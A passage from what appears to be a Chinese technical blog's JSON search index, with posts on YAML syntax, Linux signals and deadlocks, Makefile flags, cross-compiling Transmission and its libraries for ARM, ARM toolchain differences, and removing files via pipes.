）的设计目标，就是方便人类读写。它实质上是一种通用的数据串行化格式。它的基本语法规则如下。\n\n- 大小写敏感\n- 使用缩进表示层级关系\n- 缩进时不允许使用Tab键，只允许使用空格。\n- 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可\n\n\n\nYAML 支持的数据结构有三种。\n\n- 对象：键值对的集合(map)\n- 数组：一组按次序排列的值(array)\n- 纯量（scalars）：单个的、不可再分的值\n\n<!-- more -->\n\n## YAML 语法\n\n1.  `#` 表示注释，从这个字符一直到行尾，都会被解析器忽略。\n\n\n\n2. `...` 和`---`配合使用，在一个配置文件中代表一个文件的结束：\n\n\n   ```\n---\ntime: 20:03:20\nplayer: Sammy Sosa\naction: strike (miss)\n...\n\n---\ntime: 20:03:47\nplayer: Sammy Sosa\naction: grand slam\n...\n   ```\n\n  相当于在一个yaml文件中连续写了两个yaml配置项。\n\n\n\n#### 对象\n\n对象的一组键值对，使用冒号结构表示。\n\n```javascript\nanimal: pets\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ animal: 'pets' }\n```\n\nYaml 也允许另一种写法，将所有键值对写成一个行内对象。\n\n```javascript\nhash: { name: Steve, foo: bar } \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ hash: { name: 'Steve', foo: 'bar' } }\n```\n\n\n\n较为复杂的对象格式，可以使用问号加一个空格代表一个复杂的key，配合一个冒号加一个空格代表一个value：\n\n```\n?  \n    - complexkey1\n    - complexkey2\n:\n    - complexvalue1\n    - complexvalue2\n```\n\n意思即对象的属性是一个数组[complexkey1,complexkey2]，对应的值也是一个数组[complexvalue1,complexvalue2]\n\n\n\n#### 数组\n\n一组连词线开头的行，构成一个数组。\n\n```javascript\n- Cat\n- Dog\n- Goldfish\n```\n\n转为 JavaScript 如下。\n\n```javascript\n[ 'Cat', 'Dog', 'Goldfish' ]\n```\n\n\n\n数据结构的子成员是一个数组，则可以在该项下面缩进一个空格。\n\n```javascript\n-\n - Cat\n - Dog\n - Goldfish\n```\n\n转为 JavaScript 如下。\n\n```javascript\n[ [ 'Cat', 'Dog', 'Goldfish' ] ]\n```\n\n数组也可以采用行内表示法。\n\n```javascript\nanimal: [Cat, Dog]\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ animal: [ 'Cat', 'Dog' ] }\n```\n\n#### 复合结构\n\n对象和数组可以结合使用，形成复合结构。\n\n```javascript\nlanguages:\n - Ruby\n - Perl\n - Python \nwebsites:\n YAML: yaml.org \n Ruby: ruby-lang.org \n Python: python.org \n Perl: use.perl.org \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ languages: [ 'Ruby', 'Perl', 'Python' ],\n  websites: \n   { \n     YAML: 'yaml.org',\n     Ruby: 'ruby-lang.org',\n     Python: 'python.org',\n     Perl: 'use.perl.org' \n   } \n}\n```\n\n#### 纯量\n\n纯量是最基本的、不可再分的值。以下数据类型都属于 JavaScript 的纯量。\n\n- 字符串\n- 布尔值\n- 整数\n- 浮点数\n- Null\n- 时间\n- 日期\n\n数值直接以字面量的形式表示。\n\n```javascript\nnumber: 12.30\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ number: 12.30 }\n```\n\n\n\n布尔值用`true`和`false`表示。\n\n```javascript\nisSet: true\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ isSet: true }\n```\n\n\n\n`null`用`~`表示。\n\n```javascript\nparent: ~ \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ parent: null }\n```\n\n\n\n时间采用 ISO8601 格式。\n\n```javascript\niso8601: 2001-12-14t21:59:43.10-05:00 \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ iso8601: new Date('2001-12-14t21:59:43.10-05:00') }\n```\n\n\n\n日期采用复合 iso8601 格式的年、月、日表示。\n\n```javascript\ndate: 1976-07-31\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ date: new Date('1976-07-31') }\n```\n\n\n\nYAML 允许使用两个感叹号，强制转换数据类型。\n\n```javascript\ne: !!str 123\nf: !!str true\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ e: '123', f: 'true' }\n```\n\n\n\n#### 字符串\n\n字符串是最常见，也是最复杂的一种数据类型。字符串默认不使用引号表示。\n\n```javascript\nstr: 这是一行字符串\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '这是一行字符串' }\n```\n\n\n\n如果字符串之中包含空格或特殊字符，需要放在引号之中。\n\n```javascript\nstr: '内容： 字符串'\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '内容: 字符串' }\n```\n\n\n\n单引号和双引号都可以使用，`双引号不会对特殊字符转义。`\n\n```javascript\ns1: '内容\\n字符串'\ns2: \"内容\\n字符串\"\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ s1: '内容\\\\n字符串', s2: '内容\\n字符串' }\n```\n\n\n\n单引号之中如果还有单引号，必须连续使用两个单引号转义。\n\n```javascript\nstr: 'labor''s day' \n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: 'labor\\'s day' }\n```\n\n\n\n字符串可以写成多行，从第二行开始，必须有一个单空格缩进。换行符会被转为空格。\n\n```javascript\nstr: 这是一段\n  多行\n  字符串\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ str: '这是一段 多行 字符串' }\n```\n\n\n\n多行字符串可以使用`|`保留换行符，也可以使用`>`折叠换行。\n\n```javascript\nthis: |\n  Foo\n  Bar\nthat: >\n  Foo\n  Bar\n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n{ this: 'Foo\\nBar\\n', that: 'Foo Bar\\n' }\n```\n\n\n\n`+`表示保留文字块末尾的换行，`-`表示删除字符串末尾的换行。\n\n```javascript\ns1: |\n  Foo\n\ns2: |+\n  Foo\n\n\ns3: |-\n  Foo\n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n{ s1: 'Foo\\n', s2: 'Foo\\n\\n\\n', s3: 'Foo' }\n```\n\n\n\n字符串之中可以插入 HTML 标记。\n\n```javascript\nmessage: |\n\n  <p style=\"color: red\">\n    段落\n  </p>\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ message: '\\n<p style=\"color: red\">\\n  段落\\n</p>\\n' }\n```\n\n\n\n#### 引用\n\n锚点`&`和别名`*`，可以用来引用。\n\n```javascript\ndefaults: &defaults\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  <<: *defaults\n\ntest:\n  database: myapp_test\n  <<: *defaults\n```\n\n等同于下面的代码。\n\n```javascript\ndefaults:\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  adapter:  postgres\n  host:     localhost\n\ntest:\n  database: myapp_test\n  adapter:  postgres\n  host:     localhost\n```\n\n`&`用来建立锚点（`defaults`），`<<`表示合并到当前数据，`*`用来引用锚点。\n\n\n\n下面是另一个例子。\n\n```javascript\n- &showell Steve \n- Clark \n- Brian \n- Oren \n- *showell \n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n[ 'Steve', 'Clark', 'Brian', 'Oren', 'Steve' ]\n```\n\n\n\n## YAML实练\n\nhttp://nodeca.github.io/js-yaml/\n","tags":["yaml"],"categories":["计算机基础"]},{"title":"linux信号和锁","url":"%2Fp%2F572d7368.html","content":"\n# 1. 信号\n\n### 1.1 产生信号的条件\n\n- 用户在终端按下某些键时，终端驱动程序会发送信号给前台进程，例如Ctrl-C产生`SIGINT`信号，Ctrl-\\产生`SIGQUIT`信号，Ctrl-Z产生`SIGTSTP`信号。\n- 硬件异常产生信号，这些条件由硬件检测到并通知内核，然后内核向当前进程发送适当的信号。例如当前进程执行了除以0的指令，CPU的运算单元会产生异常，内核将这个异常解释为`SIGFPE`信号发送给进程。再比如当前进程访问了非法内存地址，，MMU会产生异常，内核将这个异常解释为`SIGSEGV`信号发送给进程。\n- 一个进程调用`kill(2)`函数可以发送信号给另一个进程。\n- 可以用`kill(1)`命令发送信号给某个进程，`kill(1)`命令也是调用`kill(2)`函数实现的，如果不明确指定信号则发送`SIGTERM`信号，该信号的默认处理动作是终止进程。\n- 当内核检测到某种软件条件发生时也可以通过信号通知进程，例如闹钟超时产生`SIGALRM`信号，向读端已关闭的管道写数据时产生`SIGPIPE`信号。\n\n<!-- more -->\n\n### 1.2 处理信号\n\n如果不想按默认动作处理信号，用户程序可以调用`sigaction(2)`函数告诉内核如何处理某种信号（`sigaction`函数稍后详细介绍），可选的处理动作有以下三种：\n\n1. 忽略此信号。\n2. 执行该信号的默认处理动作。\n3. 提供一个信号处理函数，要求内核在处理该信号时切换到用户态执行这个处理函数，这种方式称为捕捉（Catch）一个信号。\n\n# 2. 锁\n\n### 2.1 死锁\n\n当两个线程为了保护两个不同的共享资源而使用了两个互斥锁，那么这两个互斥锁应用不当的时候，可能会造成两个线程都在等待对方释放锁，在没有外力的作用下，这些线程会一直相互等待，就没办法继续运行，这种情况就是发生了死锁。\n\n##### 1. 产生条件\n\n1. 互斥条件：一个资源每次只能被一个线程使用。\n\n   ![img](linux信号和锁/互斥条件.png)\n\n2. 持有并等待条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。\n\n   ![img](linux信号和锁/持有并等待条件.png)\n\n3. 不剥夺条件：进程已获得的资源，在未使用完之前，不能强行剥夺。\n\n   ![img](linux信号和锁/不可剥夺条件.png)\n\n4. 环路等待条件：若干进程之间形成一种头尾相接的循环等待资源关系。\n\n   ![img](linux信号和锁/环路等待条件.png)\n\n只要破坏死锁 4 个必要条件之一中的任何一个，死锁问题就能被解决。\n\n##### 2. 解放方案\n\n避免死锁问题就只需要破环其中一个条件就可以，最常见的并且可行的就是使用资源有序分配法，来破环环路等待条件。\n\n线程 A 和 线程 B 获取资源的顺序要一样，当线程 A 是先尝试获取资源 A，然后尝试获取资源 B 的时候，线程 B 同样也是先尝试获取资源 A，然后尝试获取资源 B。所以我们只需将线程 B 改成以相同顺序的获取资源，就可以打破死锁了。\n\n\n\n# 3. 参考资料\n\n+ https://akaedu.github.io/book/ （Linux C编程一站式学习）\n+ https://www.cnblogs.com/crazymakercircle/p/14323919.html\n+ https://xiaolincoding.com/os/4_process/deadlock.html\n\n","tags":["linux"],"categories":["系统"]},{"title":"makefile的选项CFLAGS、CPPFLAGS、LDFLAGS和LIBS的区别","url":"%2Fp%2F271bdf2a.html","content":"\n\n\n先看一个例子:\n\n```shell\nexport CFLAGS=\"-I/root/ARM/opt/include\"\nexport LDFLAGS=\"-L/root/ARM/opt/lib\"\n```\n\n\n\n**CFLAGS**： 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n\n**LDFLAGS**：gcc 等编译器会用到的一些优化参数，也可以在里面指定库文件的位置。用法：LDFLAGS=-L/usr/lib -L/path/to/your/lib。每安装一个包都几乎一定的会在安装目录里建立一个lib目录。如果明明安装了某个包，而安装另一个包时，它愣是说找不到，可以抒那个包的lib路径加入的LDFALGS中试一下。\n\n**LIBS**：告诉链接器要链接哪些库文件，如LIBS = -lpthread -liconv\n\n<!-- more -->\n\n### CFLAGS,CXXFLAGS,CPPFLAGS的区别\n\nCFLAGS 表示用于 C 编译器的选项\n\nCXXFLAGS 表示用于 C++ 编译器的选项。\n\nCPPFLAGS 可以 用于 C 和 C++ 两者。\n\n\n\n### LDFLAGS,LIBS的区别\n\nLDFLAGS是选项，LIBS是要链接的库。都是喂给ld的，只不过一个是告诉ld怎么吃，一个是告诉ld要吃什么。\n\n看看如下选项：\n\n```shell\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib\nLIBS = -lmysqlclient -liconv\n```\n\n这就明白了。LDFLAGS告诉链接器从哪里寻找库文件，LIBS告诉链接器要链接哪些库文件。不过使用时链接阶段这两个参数都会加上，所以你即使将这两个的值互换，也没有问题。\n\n\n\n说到这里，进一步说说LDFLAGS指定-L虽然能让链接器找到库进行链接，但是运行时链接器却找不到这个库，如果要让软件运行时库文件的路径也得到扩展，那么我们需要增加这两个库给\"-Wl,R\"\n\n```\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\n```\n\n如 果在执行./configure以前设置环境变量export LDFLAGS=\"-L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\" ，注意设置环境变量等号两边不可以有空格，而且要加上引号哦（shell的用法）。执行configure以后，Makefile将会设置这个选项， 链接时会有这个参数，编译出来的可执行程序的库文件搜索路径就得到扩展了。\n\n\n\n### 参考链接:\n\nhttps://forum.golangbridge.org/t/cflags-ldflags-documentation-somewhere/4520/10","tags":["makefile"],"categories":["系统"]},{"title":"交叉编译arm-transmission-2.94","url":"%2Fp%2F73da9612.html","content":"\n\n\n# 1. 编译平台准备工作\n\n1. 下载arm-none-linux-gnueabi-gcc\n\n2. 下载transmission-2.94\n\n3. 新建ARM文件夹\n\n4. 解压arm-none-linux-gnueabi-gcc和transmission-2.94到ARM文件夹\n\n5. 设置编译平台环境变量\n\n   ```shell\n   export PATH=\"/root/ARM/external-toolchain/bin:$PATH\"\n   export cross=arm-none-linux-gnueabi-\n   export CC=\"${cross}gcc\"\n   ```\n\n6. 编译的时候一定要注意看log, 是arm-none-linux-gnueabi-gcc编译的才是正确的\n\n<!-- more -->\n\n\n\n# 2. 目标平台开始编译\n\n### 2.1 transmission\n\n```shell\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd_daemon  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/ARM/transmission-2.94/a(绝对路径)\n```\n\n\n\ngit clone下来的需要执行./autogen.sh\n\n```shell\n./autogen.sh --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\" \n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/transmission/a(绝对路径)\n```\n\n\n\n错误1. 出现No package 'libevent' found ->安装libevent\n\n错误2. fatal error: curl/curl.h: No such file or directory -> 安装curl\n\n错误3. rpcimpl.c:16:18: fatal error: zlib.h: No such file or directory ->安装zlib\n\n错误4. fatal error: systemd/sd-daemon.h: No such file or directory ->需要安装systemd, 此处强烈建议使用`--without-systemd_daemon`选项, 否则编译systemd又是一堆依赖\n\n\n\n### 2.2 libevent\n\n```shell\nwget https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz\ncd libevent-2.0.21-stable\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=\"/root/ARM/opt/\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n### 2.3 libcurl\n\n```shell\nwget https://curl.haxx.se/download/curl-7.61.1.tar.gz\ntar zxvf curl-7.61.1.tar.gz\ncd curl-7.61.1\n./configure --prefix=\"/root/ARM/opt/\" --target=arm-none-linux-gnueabi --host=arm-none-linux-gnueabi --with-zlib=\"/root/ARM/opt\" --with-ssl=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n错误1. configure: error: /root/ARM/opt is a bad --with-ssl prefix! -> 安装openssl\n\n\n\n### 2.4 openssl\n\n```shell\nwget https://www.openssl.org/source/openssl-1.1.1.tar.gz\ntar zxvf openssl-1.1.1.tar.gz\ncd openssl-1.1.1\n./Configure linux-generic32 shared  -DL_ENDIAN --prefix=/root/ARM/opt --openssldir=/root/ARM/opt\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" MAKEDEPPROG=\"${cross}gcc\" PROCESSOR=ARM\nmake install\n```\n\n\n\n### 2.5 zlib\n\n```shell\nwget http://zlib.net/zlib-1.2.11.tar.gz\ntar zxvf zlib-1.2.11.tar.gz\ncd zlib-1.2.11\n./configure --prefix=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n# 3. 编译systemd\n\n参考: https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM\n\n#### 1. libkmod\n\n```shell\nwget https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-17.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ \n\nmake \nmake install \n```\n\n#### 2. libffi\n\n```shell\nwget https://sourceware.org/ftp/libffi/libffi-3.2.1.tar.gz\n./configure --prefix=/root/ARM/opt/  CC=arm-none-linux-gnueabi-gcc --host=arm-none-linux-gnueabi   \n\nmake\nmake install\n```\n\n#### 3. pcre\n\n```shell\nwget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.42.tar.gz\n./configure --prefix=/root/ARM/opt/ --host=arm-none-linux-gnueabi   CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\"\n\nmake\nmake install\n```\n\n#### 4. libattr\n\n```shell\nwget https://download-mirror.savannah.gnu.org/releases/attr/attr-2.4.48.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" \nmake install\n```\n\n#### 5. libcap\n\n```shell\nwget https://www.kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.24.tar.xz \nmake prefix=/root/ARM/opt/  BUILD_CC=gcc  CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\nmake不成功修改文件:\n\n```shell\nvi libcap/cap_file.c\n\n-#ifdef VFS_CAP_U32\n+#if defined (VFS_CAP_U32) && defined (XATTR_NAME_CAPS)\n```\n\n#### 6. glibc(没有成功....)\n\n```shell\nwget http://ftp.gnome.org/pub/gnome/sources/glib/2.52/glib-2.52.3.tar.xz\n\nexport glib_cv_stack_grows=no; \\\nexport glib_cv_uscore=no; \\\nexport ac_cv_func_posix_getpwuid_r=no; \\\nexport ac_cv_func_posix_getgrgid_r=no; \\\nCFLAGS=-I/root/ARM/opt/include \\\nLDFLAGS=-L/root/ARM/opt/lib \\\n\n \n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ --disable-libmount\n```\n\n\n\n# 4. 目标平台运行\n\n+ systemd编译失败, 可在编译transmission的时候去掉systemd\n\n+ 目标平台执行transmission的环境变量(可忽略)\n\n```shell\nexport PATH=/dev/opt/bin:$PATH\nexport LD_LIBRARY_PATH=/dev/opt/lib:$LD_LIBRARY_PATH\nexport CURL_CA_BUNDLE=/mnt/Sync2/ca.crt\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_KEY=/mnt/Sync2/key.pem\nexport STNOUPGRADE=1\n```\n\n\n\n# 5. 参考资料\n\n+ https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM","tags":["transmission"],"categories":["bittorrent"]},{"title":"arm交叉编译器的区别","url":"%2Fp%2Fa63b0191.html","content":"\n\n\n## 为什么要用交叉编译器？\n\n交叉编译通俗地讲就是在一种平台上编译出能运行在体系结构不同的另一种平台上的程序，比如在PC平台（X86 CPU）上编译出能运行在以ARM为内核的CPU平台上的程序，编译得到的程序在X86 CPU平台上是不能运行的，必须放到ARM CPU平台上才能运行，虽然两个平台用的都是Linux系统。\n\n交叉编译工具链是一个由编译器、连接器和解释器组成的综合开发环境，交叉编译工具链主要由binutils、gcc和glibc三个部分组成。有时出于减小 libc 库大小的考虑，也可以用别的 c 库来代替 glibc，例如 uClibc、dietlibc 和 newlib。\n\n建立交叉编译工具链是一个相当复杂的过程，如果不想自己经历复杂繁琐的编译过程，网上有一些编译好的可用的交叉编译工具链可以下载，但就以学习为目的来说读者有必要学习自己制作一个交叉编译工具链（目前来看，对于初学者没有太大必要自己交叉编译一个工具链）。\n\n<!-- more -->\n\n## 分类和说明\n\n从授权上，分为免费授权版和付费授权版。\n\n免费版目前有三大主流工具商提供，第一是GNU（提供源码，自行编译制作），第二是 Codesourcery，第三是Linora。\n\n收费版有ARM原厂提供的armcc、IAR提供的编译器等等，因为这些价格都比较昂贵，不适合学习用户使用，所以不做讲述。\n\n\n\n+ arm-none-linux-gnueabi-gcc：是 Codesourcery 公司（目前已经被Mentor收购）基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM（32位）系统中所有环节的代码，包括裸机程序、u-boot、Linux  kernel、filesystem和App应用程序。\n\n+ arm-linux-gnueabihf-gcc：是由 Linaro 公司基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM（32位）系统中所有环节的代码，包括裸机程序、u-boot、Linux kernel、filesystem和App应用程序。\n\n+ aarch64-linux-gnu-gcc：是由 Linaro 公司基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARMv8 64位目标中的裸机程序、u-boot、Linux  kernel、filesystem和App应用程序。\n\n+ arm-none-elf-gcc：是 Codesourcery 公司（目前已经被Mentor收购）基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM MCU（32位）芯片，如ARM7、ARM9、Cortex-M/R芯片程序。\n\n+ arm-none-eabi-gcc：是 GNU 推出的的ARM交叉编译工具。可用于交叉编译ARM MCU（32位）芯片，如ARM7、ARM9、Cortex-M/R芯片程序。\n\n\n\n## 交叉编译器下载\n\n- arm-none-linux-gnueabi-gcc下载：<http://www.veryarm.com/arm-none-linux-gnueabi-gcc>\n- arm-linux-gnueabihf-gcc下载：<http://www.veryarm.com/arm-linux-gnueabihf-gcc>\n- aarch64-linux-gnu-gcc下载：<http://www.veryarm.com/aarch64-linux-gnu-gcc>\n- arm-none-elf-gcc下载：<http://www.veryarm.com/arm-none-elf-gcc>\n- arm-none-eabi-gcc下载：<http://www.veryarm.com/arm-none-eabi-gcc>\n\n 以上地址都是直接从官网转存到百度云盘，仅为方便国内用户下载使用，并非本站制作，请勿用于商业或者非法用途。因为版本多难以选择，所以我们建议您使用该类编译器的最新版本。\n\n\n\n## 命名规则\n\n交叉编译工具链的命名规则为：`arch [-vendor][-os] [-(gnu)eabi]`\n\n- **arch** - 体系架构，如ARM，MIPS\n- **vendor** - 工具链提供商\n- **os** - 目标操作系统\n- **eabi** - 嵌入式应用二进制接口（Embedded Application Binary Interface）\n\n根据对操作系统的支持与否，ARM GCC可分为支持和不支持操作系统，如\n\n- **arm-none-eabi**：这个是没有操作系统的，自然不可能支持那些跟操作系统关系密切的函数，比如fork(2)。他使用的是newlib这个专用于嵌入式系统的C库。\n- **arm-none-linux-eabi**：用于Linux的，使用Glibc\n\n\n\n##  实例\n\n#### 1、arm-none-eabi-gcc\n\n（ARM architecture，no vendor，not target an operating system，complies with the ARM EABI）\n用于编译 ARM 架构的裸机系统（包括 ARM Linux 的 boot、kernel，不适用编译 Linux 应用 Application），一般适合 ARM7、Cortex-M 和 Cortex-R 内核的芯片使用，所以不支持那些跟操作系统关系密切的函数，比如fork(2)，他使用的是 newlib 这个专用于嵌入式系统的C库。\n\n#### 2、arm-none-linux-gnueabi-gcc  //常用的\n\n(ARM architecture, no vendor, creates binaries that run on the **Linux** operating system, and uses the GNU EABI)\n\n主要用于基于ARM架构的Linux系统，可用于编译 ARM 架构的 u-boot、Linux内核、linux应用等。arm-none-linux-gnueabi基于GCC，使用Glibc库，经过 `Codesourcery` 公司优化过推出的编译器。arm-none-linux-gnueabi-xxx 交叉编译工具的浮点运算非常优秀。一般ARM9、ARM11、Cortex-A 内核，带有 Linux 操作系统的会用到。\n\n#### 3、arm-eabi-gcc\n\nAndroid ARM 编译器。\n\n#### 4、armcc\n\nARM 公司推出的编译工具，功能和 arm-none-eabi 类似，可以编译裸机程序（u-boot、kernel），但是不能编译 Linux 应用程序。armcc一般和ARM开发工具一起，Keil MDK、ADS、RVDS和DS-5中的编译器都是armcc，所以 armcc 编译器都是收费的（爱国版除外，呵呵~~）。\n\n#### 5、arm-none-uclinuxeabi-gcc 和 arm-none-symbianelf-gcc\n\narm-none-uclinuxeabi 用于**uCLinux**，使用Glibc。\n\narm-none-symbianelf 用于**symbian**，没用过，不知道C库是什么 。\n\n\n\n## ABI 和 EABI\n\n**ABI**：二进制应用程序接口(Application Binary Interface (ABI) for the ARM Architecture)。在计算机中，应用二进制接口描述了应用程序（或者其他类型）和操作系统之间或其他应用程序的低级接口。\n\n**EABI**：嵌入式ABI。嵌入式应用二进制接口指定了文件格式、数据类型、寄存器使用、堆积组织优化和在一个嵌入式软件中的参数的标准约定。开发者使用自己的汇编语言也可以使用 EABI 作为与兼容的编译器生成的汇编语言的接口。\n\n两者主要区别是，ABI是计算机上的，EABI是嵌入式平台上（如ARM，MIPS等）。\n\n\n\n## Codesourcery公司\n\nCodesourcery推出的产品叫Sourcery G++ Lite Edition，其中基于command-line的编译器是免费的，在官网上可以下载，而其中包含的IDE和debug 工具是收费的，当然也有30天试用版本的。\n\n目前CodeSourcery已经由明导国际(Mentor Graphics)收购，所以原本的网站风格已经全部变为 Mentor 样式，但是 Sourcery G++ Lite Edition 同样可以注册后免费下载。\n\nCodesourcery一直是在做ARM目标 GCC 的开发和优化，它的ARM GCC在目前在市场上非常优秀，很多 patch 可能还没被gcc接受，所以还是应该直接用它的。\n\n而且他提供Windows下[mingw交叉编译的]和Linux下的二进制版本，比较方便；如果不是很有时间和兴趣，不建议下载 src 源码包自己编译，很麻烦，Codesourcery给的shell脚本很多时候根本没办法直接用，得自行提取关键的部分手工执行，又费精力又费时间，如果想知道细节，其实不用自己编译一遍，看看他是用什么步骤构建的即可，如果你对交叉编译器感兴趣的话。\n\n\n\n## arm-linux-gnueabi-gcc 和 arm-linux-gnueabihf-gcc\n\n两个交叉编译器分别适用于 armel 和 armhf 两个不同的架构，armel 和 armhf 这两种架构在对待浮点运算采取了不同的策略（有 fpu 的 arm 才能支持这两种浮点运算策略）。\n\n其实这两个交叉编译器只不过是 gcc 的选项 -mfloat-abi 的默认值不同。gcc 的选项 -mfloat-abi 有三种值 **soft、softfp、hard**（其中后两者都要求 arm 里有 fpu 浮点运算单元，soft 与后两者是兼容的，但 softfp 和 hard 两种模式互不兼容）：\n**soft：** 不用fpu进行浮点计算，即使有fpu浮点运算单元也不用，而是使用软件模式。\n**softfp：** armel架构（对应的编译器为 arm-linux-gnueabi-gcc ）采用的默认值，用fpu计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算。\n**hard：** armhf架构（对应的编译器 arm-linux-gnueabihf-gcc ）采用的默认值，用fpu计算，传参数也用fpu中的浮点寄存器传，省去了转换，性能最好，但是中断负荷高。\n\n\n\n把以下测试使用的C文件内容保存成 mfloat.c：\n\n```c\n#include <stdio.h>\nint main(void)\n{\n    double a,b,c;\n    a = 23.543;\n    b = 323.234;\n    c = b/a;\n    printf(“the 13/2 = %f\\n”, c);\n    printf(“hello world !\\n”);\n    return 0;\n}\n```\n\n\n\n**1、使用 arm-linux-gnueabihf-gcc 编译，使用“-v”选项以获取更详细的信息：**\n\\# arm-linux-gnueabihf-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=hard’ ‘-mfpu=vfpv3-d16′ ‘-mthumb’\n-mfloat-abi=hard\n\n可看出使用hard硬件浮点模式。\n\n**2、使用 arm-linux-gnueabi-gcc 编译：**\n\\# arm-linux-gnueabi-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=softfp’ ‘-mfpu=vfpv3-d16′ ‘-mthumb’\n-mfloat-abi=softfp\n\n可看出使用softfp模式。","tags":["arm"],"categories":["系统"]},{"title":"使用管道删除不规则文件","url":"%2Fp%2Fa7ad4d37.html","content":"\n\n### 1. 使用 xargs rm \n\n```\nls | grep abcd | rm  //错误用法\n```\n\n\n\nrm doesn't accept input from `stdin`. You'll need to do something like\n\n```\nls | grep abcd | xargs rm\n```\n\n但是遇到不规则符号的文件有可能删除不了.\n\n\n\n### 2. 使用 find exec\n\n可以删除不规则符号文件:\n```\nfind . -name \"*td*\" -exec rm -f {} \\;\n```\n\n","tags":["linux"],"categories":["系统"]},{"title":"深入了解CPU架构","url":"%2Fp%2F690c18bd.html","content":"\n\n\n## 1. CPU是什么\n\n中央处理单元（CPU）主要由运算器、控制器、寄存器三部分组成，从字面意思看运算器就是起着运算的作用，控制器就是负责发出CPU每条指令所需要的信息，寄存器就是保存运算或者指令的一些临时文件，这样可以保证更高的速度。  